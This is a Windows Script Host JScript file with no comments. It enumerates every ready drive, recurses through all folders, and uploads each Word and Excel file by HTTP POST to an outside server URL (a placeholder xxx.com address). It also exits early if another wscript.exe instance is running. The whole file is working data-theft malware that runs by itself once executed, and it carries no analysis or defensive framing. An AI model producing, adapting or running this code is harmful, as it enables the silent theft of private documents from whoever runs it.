var __POSTURL__ = 'http://www.xxx.com/server.php';

function UpFile(FilePath, FileName) {
	var Stream = new ActiveXObject('ADODB.Stream');
	Stream.Type = 1;
	Stream.Open();
	Stream.LoadFromFile(FilePath);
	var XHR = new ActiveXObject('Msxml2.XMLHTTP' || 'Microsoft.XMLHTTP');
	XHR.open('POST', __POSTURL__, false);
	XHR.setRequestHeader('fileName', FileName);
	XHR.setRequestHeader('enctype', 'multipart/form-data');
	XHR.send(Stream.Read());
	Stream.Close();
	return XHR.responseText
}
function GetDriveList() {
	var fso = new ActiveXObject("Scripting.FileSystemObject");
	var e = new Enumerator(fso.Drives);
	var re = [];
	for (; ! e.atEnd(); e.moveNext()) {
		if (e.item().IsReady) {
			re.push(e.item().DriveLetter)
		}
	}
	return re
}
function GetFolderList(folderspec) {
	var fso = new ActiveXObject("Scripting.FileSystemObject");
	var f = fso.GetFolder(folderspec);
	var fc = new Enumerator(f.SubFolders);
	var re = [];
	for (; ! fc.atEnd(); fc.moveNext()) {
		re.push(fc.item())
	}
	return re
}
function GetFileList(folderspec) {
	var fso = new ActiveXObject("Scripting.FileSystemObject");
	var f = fso.GetFolder(folderspec);
	var fc = new Enumerator(f.files);
	var re = [];
	for (; ! fc.atEnd(); fc.moveNext()) {
		re.push([fc.item(), fc.item().Name])
	}
	return re
}
function Search(Drive) {
	var FolderList = GetFolderList(Drive);
	for (var i = 0; i < FolderList.length; i++) {
		Search(FolderList[i])
	}
	var FileList = GetFileList(Drive);
	for (var i = 0; i < FileList.length; i++) {
		if (/\.(doc|docx|xls|xlsx)$/i.test(FileList[i])) {
			UpFile(FileList[i][0], FileList[i][1])
		}
	}
}
function Load() {
	var WMIs = GetObject("winmgmts:\\\\.\\root\\cimv2");
	var Items = WMIs.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'wscript.exe'");
	var i = 0,
	rs = new Enumerator(Items);
	for (; ! rs.atEnd(); rs.moveNext()) {
		i++
	}
	if (i > 1) WScript.Quit(0);
	Items = WMIs = i = rs = null;
	var DriveList = GetDriveList();
	for (var i = 0; i < DriveList.length; i++) {
		Search(DriveList[i] + ":\\\\")
	}
}
Load();